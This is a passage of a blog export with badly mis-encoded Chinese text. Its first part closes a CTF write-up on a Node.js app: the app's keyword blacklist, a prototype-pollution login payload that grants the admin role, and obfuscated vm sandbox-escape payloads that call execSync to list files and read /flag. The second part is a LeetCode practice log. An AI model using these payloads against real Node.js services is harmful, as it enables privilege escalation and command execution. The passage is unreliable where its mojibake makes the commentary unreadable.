class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;child_process&#x27;</span>, <span class="hljs-string">&#x27;process&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execSync&#x27;</span>, <span class="hljs-string">&#x27;execFile&#x27;</span>, <span class="hljs-string">&#x27;execFileSync&#x27;</span>, <span class="hljs-string">&#x27;spawn&#x27;</span>, <span class="hljs-string">&#x27;spawnSync&#x27;</span>, <span class="hljs-string">&#x27;fork&#x27;</span>]<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v <span class="hljs-keyword">of</span> blacklist) &#123;<br>        <span class="hljs-keyword">if</span> (code.<span class="hljs-title function_">includes</span>(v)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(v + <span class="hljs-string">&#x27; is banned&#x27;</span>)<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>) &#123;<br>        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key]<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/index.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/login.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/register.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login success&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login failed&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register failed&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        users[username] = password<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register success&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/profile&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-string">&#x27;user&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>,<br>        <span class="hljs-string">&#x27;role&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/sandbox&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span><br>        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox)<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_">waf</span>(code)<br>            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context)<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: result<br>            &#125;)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: e.<span class="hljs-property">message</span><br>            &#125;)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;result&#x27;</span>: <span class="hljs-string">&#x27;Your role is not admin, so you can not run any code&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/logout&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">destroy</span>()<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;server start listening on :3000&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹å’ŒåŸå‹é“¾æ±¡æŸ“æœ‰å…³çš„éƒ¨åˆ†ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>) <span class="hljs-comment">//è§£æ„èµ‹å€¼ï¼Œä»req.bodyå¯¹è±¡ä¸­æå–usernameå’Œpasswordå±æ€§å€¼ï¼Œå¹¶å°†å®ƒä»¬åˆ†åˆ«èµ‹å€¼ç»™å˜é‡usernameå’Œpasswordã€‚</span><br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123; <span class="hljs-comment">//ç›®çš„æ˜¯æ‹¿åˆ°adminè§’è‰²</span><br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><span class="hljs-comment">//clone(req.body)çœ‹æˆmerge(&#123;&#125;, req.body)ã€‚åˆ©ç”¨req.bodyæ±¡æŸ“adminså³å¯</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>POST</code>åŒ…ä¸­å¢åŠ å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//__proto__è¢«è¿‡æ»¤ï¼Œé€šè¿‡&quot;constructor&quot;: &#123;&quot;prototype&quot;: ç»•è¿‡å³å¯</span><br>&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;constructor&quot;</span>: &#123;<span class="hljs-string">&quot;prototype&quot;</span>: &#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//å­˜åœ¨admins.__proto__.test=123ï¼Œusername=&#x27;test&#x27;ï¼Œä½¿å¾—username in adminsæˆç«‹</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/img/sb2.png" alt="sb2"></p><p><code>payload:</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; <br><span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <br><span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span><br><span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()<br><span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-title function_">toString</span>();<br> &#125;<br>&#125;)<br>æˆ–<br><span class="hljs-keyword">let</span> obj = &#123;&#125; <br>obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span><br><span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()<br><span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>&#125;)<br><span class="hljs-keyword">throw</span> obj<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LeetCodeåšé¢˜è®°å½•_1</title>
    <link href="/2023/09/19/2023-9-19-LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_1/"/>
    <url>/2023/09/19/2023-9-19-LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_1/</url>
    
    <content type="html"><![CDATA[<p>ä»£ç èƒ½åŠ›å¤ªå·®äº†ï¼Œåœ¨leetCodeä¸Šåšç‚¹ç®€å•çš„é¢˜ã€‚è®°å½•ä¸€ä¸‹ğŸ˜€</p><span id="more"></span><hr><p>ä»£ç èƒ½åŠ›å®Œå…¨æ˜¯å…¥é—¨çº§åˆ«ã€‚ã€‚åªä¼šå†™ç‚¹å¼‚å¸¸ç®€å•çš„ä¸œè¥¿ï¼Œå‡†å¤‡åšç‚¹é¢˜æå‡ä¸‹èƒ½åŠ›ã€‚</p><p>åœ¨åšé¢˜è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¼šå°½å¯èƒ½ä½¿ç”¨æˆ‘æ¥è§¦è¿‡çš„<code>python</code>,<code>java</code>,<code>c++</code>æ¥è§£é¢˜ã€‚</p><p>å½“ç„¶ï¼Œâ€œå°½å¯èƒ½â€ï¼Œå†™ä¸å†™çš„å‡ºæ¥å°±æ˜¯å¦å¤–ä¸€å›äº‹äº†</p><h2 id="1-ä¸¤æ•°ä¹‹å’Œ"><a href="#1-ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="1.ä¸¤æ•°ä¹‹å’Œ"></a>1.ä¸¤æ•°ä¹‹å’Œ</h2><p>æè¿°ï¼šç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ <code>nums</code> å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ <code>target</code>ï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º <strong>å’Œä¸ºç›®æ ‡å€¼</strong> <em><code>target</code></em> çš„é‚£ <strong>ä¸¤ä¸ª</strong> æ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œæ•°ç»„ä¸­åŒä¸€ä¸ªå…ƒç´ åœ¨ç­”æ¡ˆé‡Œä¸èƒ½é‡å¤å‡ºç°ã€‚</p><p>ä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚</p><p>æ€è·¯å°±æ˜¯éå†ç»™å®šæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œè®©ä»–ä»¬éƒ½åŠ ä¸€éï¼Œä¸¤æ•°ä¹‹å’Œè¿›<code>if</code>æ¡ä»¶åˆ¤æ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">twoSum</span>(<span class="hljs-params">self, nums, target</span>):<br>        listlen = <span class="hljs-built_in">len</span>(nums)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(listlen):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(listlen):<br>                <span class="hljs-keyword">if</span> nums[i] + nums[j] == target:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Answer: <span class="hljs-subst">&#123;i&#125;</span>, <span class="hljs-subst">&#123;j&#125;</span>!&quot;</span>)<br><br>nums = [<span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>]<br>target = <span class="hljs-number">9</span><br><br>solution = Solution()<br>solution.twoSum(nums, target)<br>                <br><span class="hljs-comment"># è¾“å‡ºï¼šAnswer: 0, 1!</span><br><span class="hljs-comment">#      Answer: 1, 0!</span><br></code></pre></td></tr></table></figure><p><code>java</code>çš„ä¸ä¼šå†™~ç›´æ¥çœ‹äº†å®˜æ–¹ç­”æ¡ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] twoSum(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> target) &#123;<span class="hljs-comment">//å®šä¹‰äº†ä¸€ä¸ªtwoSumæ–¹æ³•ï¼Œè¿”å›ç±»å‹ä¸ºint[],è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªæ•´æ•°æ•°ç»„numså’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼targetä½œä¸ºå‚æ•°</span><br>     <span class="hljs-comment">//javaå®šä¹‰æ–¹æ³•ï¼šè®¿é—®ä¿®é¥°ç¬¦ è¿”å›ç±»å‹ æ–¹æ³•å(å‚æ•°åˆ—è¡¨)</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<span class="hljs-comment">//for (åˆå§‹åŒ–è¯­å¥; å¾ªç¯æ¡ä»¶; æ›´æ–°è¯­å¥)ï¼Œ++iæ˜¯å‰ç¼€è‡ªå¢</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span>; j &lt; n; ++j) &#123;<br>                <span class="hljs-keyword">if</span> (nums[i] + nums[j] == target) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;i, j&#125;;<span class="hljs-comment">//èŠ±æ‹¬å·åˆ›å»ºæ•°ç»„</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">0</span>];<span class="hljs-comment">//å‡å¦‚æ‰¾ä¸åˆ°ä¼šè¿”å›ä¸€ä¸ªç©ºçš„æ•´æ•°æ•°ç»„</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//https://leetcode.cn/problems/two-sum/</span><br><br></code></pre></td></tr></table></figure><h2 id="2-æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­—ä¸²"><a href="#2-æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­—ä¸²" class="headerlink" title="2.æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­—ä¸²"></a>2.æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­—ä¸²</h2><p>åšé¢˜æ„Ÿå—ï¼šæˆ‘æ˜¯SB</p><p>ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² <code>s</code> ï¼Œè¯·ä½ æ‰¾å‡ºå…¶ä¸­ä¸å«æœ‰é‡å¤å­—ç¬¦çš„ <strong>æœ€é•¿å­ä¸²</strong> çš„é•¿åº¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">length_of_longest_substring</span>(<span class="hljs-params">s</span>):<br>    char_dict = &#123;&#125;  <span class="hljs-comment"># è®°å½•æ¯ä¸ªå­—ç¬¦æœ€åä¸€æ¬¡å‡ºç°çš„ç´¢å¼•ä½ç½®</span><br>    start = <span class="hljs-number">0</span>  <span class="hljs-comment"># å­ä¸²çš„èµ·å§‹ä½ç½®</span><br>    end = <span class="hljs-number">0</span>  <span class="hljs-comment"># å­ä¸²çš„ç»“æŸä½ç½®</span><br>    max_length = <span class="hljs-number">0</span>  <span class="hljs-comment"># æœ€é•¿å­ä¸²çš„é•¿åº¦</span><br><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(s):<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> char_dict <span class="hljs-keyword">and</span> char_dict[char] &gt;= start:<br>            start = char_dict[char] + <span class="hljs-number">1</span><br>        end = i<br>        char_dict[char] = i<br>        max_length = <span class="hljs-built_in">max</span>(max_length, end - start + <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> max_length<br><br></code></pre></td></tr></table></figure><h2 id="3-è®¡ç®—åˆ—è½¦åˆ°ç«™æ—¶é—´"><a href="#3-è®¡ç®—åˆ—è½¦åˆ°ç«™æ—¶é—´" class="headerlink" title="3.è®¡ç®—åˆ—è½¦åˆ°ç«™æ—¶é—´"></a>3.è®¡ç®—åˆ—è½¦åˆ°ç«™æ—¶é—´</h2><p>ç»™ä½ ä¸€ä¸ªæ­£æ•´æ•° <code>arrivalTime</code> è¡¨ç¤ºåˆ—è½¦æ­£ç‚¹åˆ°ç«™çš„æ—¶é—´ï¼ˆå•ä½ï¼šå°æ—¶ï¼‰ï¼Œå¦ç»™ä½ ä¸€ä¸ªæ­£æ•´æ•° <code>delayedTime</code> è¡¨ç¤ºåˆ—è½¦å»¶è¯¯çš„å°æ—¶æ•°ã€‚</p><p>è¿”å›åˆ—è½¦å®é™…åˆ°ç«™çš„æ—¶é—´ã€‚</p><p>æ³¨æ„ï¼Œè¯¥é—®é¢˜ä¸­çš„æ—¶é—´é‡‡ç”¨ 24 å°æ—¶åˆ¶ã€‚</p><p>æ€è·¯å°±æ˜¯æ±‚å’Œå–æ¨¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getReal</span>(<span class="hljs-params">self</span>):<br>        arrivalTime = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆ—è½¦æ­£ç‚¹åˆ°ç«™æ—¶é—´ï¼š&quot;</span>))<br>        delayedTime = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆ—è½¦å»¶è¯¯çš„å°æ—¶æ•°ï¼š&quot;</span>))<br>        realTime = (arrivalTime + delayedTime) % <span class="hljs-number">24</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;åˆ—è½¦æœ¬è¯¥åœ¨<span class="hljs-subst">&#123;arrivalTime&#125;</span>ç‚¹åˆ°ç«™ï¼Œä½†å»¶è¯¯äº†<span class="hljs-subst">&#123;delayedTime&#125;</span>å°æ—¶ï¼Œæ‰€ä»¥å®é™…åˆ°ç«™æ—¶é—´ä¸º<span class="hljs-subst">&#123;realTime&#125;</span>ç‚¹!&quot;</span>)<br><br><span class="hljs-comment"># å®ä¾‹åŒ–Solutionç±»</span><br>solution = Solution()<br><span class="hljs-comment"># è°ƒç”¨getRealæ–¹æ³•</span><br>solution.getReal()<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//java</span><br><span class="hljs-comment">//Main.java</span><br><br><span class="hljs-keyword">import</span> java.util.Scanner;  <span class="hljs-comment">//åˆ©ç”¨Scannerç±»è¯»å–è¾“å…¥</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <span class="hljs-comment">//ç±»ä¸æ–‡ä»¶åä¿æŒä¸€è‡´</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<span class="hljs-comment">//åˆ›å»ºäº†ä¸€ä¸ªåä¸ºscannerçš„Scannerå¯¹è±¡ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºä»æ ‡å‡†è¾“å…¥æµï¼ˆSystem.inï¼‰ä¸­è¯»å–æ•°æ®</span><br><br>        System.out.print(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆ—è½¦æ­£ç‚¹åˆ°ç«™æ—¶é—´ï¼š&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">arrivalTime</span> <span class="hljs-operator">=</span> scanner.nextInt();<br><br>        System.out.print(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆ—è½¦å»¶è¯¯çš„å°æ—¶æ•°ï¼š&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">delayedTime</span> <span class="hljs-operator">=</span> scanner.nextInt();<br><br>        <span class="hljs-type">int</span> <span 